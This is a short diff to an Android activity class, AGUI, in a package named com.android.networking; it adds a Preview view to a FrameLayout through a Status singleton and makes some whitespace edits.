@@ -20,12 +20,14 @@ import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.SeekBar;
 import android.widget.SeekBar.OnSeekBarChangeListener;
+import android.widget.FrameLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 import android.widget.ToggleButton;
 
 import com.android.networking.Core;
 import com.android.networking.R;
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 
@@ -38,6 +40,8 @@ public class AGUI extends Activity implements OnSeekBarChangeListener {
 	private SeekBar seekBar;
 	private TextView textProgress;
 
+
+	
 	/**
 	 * Called when the activity is first created.
 	 * 
@@ -138,11 +142,14 @@ public class AGUI extends Activity implements OnSeekBarChangeListener {
 			seekBar.setProgress(75);
 		}
 		
+		Status.self().preview = new Preview(this); // <3>
+		((FrameLayout) findViewById(R.id.preview)).addView(Status.self().preview); // <4>		
+		
 		try {
 			((ToggleButton) runButton).setChecked(preferences.getBoolean("running", false));
 		} catch (Exception e) {
 			((ToggleButton) runButton).setChecked(false);
-		}
+		}		
 		
 		runButton.setOnClickListener(new OnClickListener() {
 			// @Override
@@ -165,4 +172,5 @@ public class AGUI extends Activity implements OnSeekBarChangeListener {
 			}
 		});
 	}
+		
 }
